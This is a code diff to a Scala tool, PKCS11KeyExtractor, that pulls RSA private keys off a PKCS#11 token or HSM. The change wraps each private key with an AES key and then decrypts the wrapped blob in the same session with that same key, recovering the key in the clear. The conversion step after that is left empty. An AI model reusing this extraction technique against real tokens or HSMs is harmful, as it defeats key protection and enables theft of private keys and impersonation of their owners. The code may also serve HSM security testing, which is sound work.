@@ -67,15 +67,31 @@ object PKCS11KeyExtractor extends App {
 
         privateKeys.foreach{ key =>
           println(s"[*] Extracting RSA Private Key (CKA_EXTRACTABLE: ${key.getExtractable.getBooleanValue}) with modulus '${key.getModulus.getByteArrayValue.map("%02x".format(_)).mkString(":").toUpperCase}'")
-          val wrappedKey = try {
-            val encryptionMechanism = Mechanism.get(PKCS11Constants.CKM_AES_CBC_PAD)
-            val encryptInitializationVector = Array[Byte](0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0)
-            val encryptInitializationVectorParameters = new InitializationVectorParameters(encryptInitializationVector)
-            encryptionMechanism.setParameters(encryptInitializationVectorParameters);
-            session.wrapKey(encryptionMechanism, wrappingKey, key)
+          if (config.verbose)
+            println(s"[?] Key Information: ${key.toString}")
+          val encryptionMechanism = Mechanism.get(PKCS11Constants.CKM_AES_CBC_PAD)
+          val encryptInitializationVector = Array[Byte](0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0)
+          val encryptInitializationVectorParameters = new InitializationVectorParameters(encryptInitializationVector)
+          encryptionMechanism.setParameters(encryptInitializationVectorParameters)
+          try {
+
+            // Wrapping Key
+            val wrappedKey = session.wrapKey(encryptionMechanism, wrappingKey, key)
+
+            // Decrypting Wrapped Key
+            val decryptionMechanism = Mechanism.get(PKCS11Constants.CKM_AES_CBC_PAD);
+            val decryptInitializationVector = Array[Byte]( 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0)
+            val decryptInitializationVectorParameters = new InitializationVectorParameters(decryptInitializationVector)
+            decryptionMechanism.setParameters(decryptInitializationVectorParameters)
+            session.decryptInit(decryptionMechanism, wrappingKey)
+            val clearKey = session.decrypt(wrappedKey)
+
+            // Converting from PKCS8 to PKCS1 
+
           } catch {
             case e: Exception => println(s"[!] Error extracting private key: '${e.getMessage}'")
           }
+
         }
 
       } else {
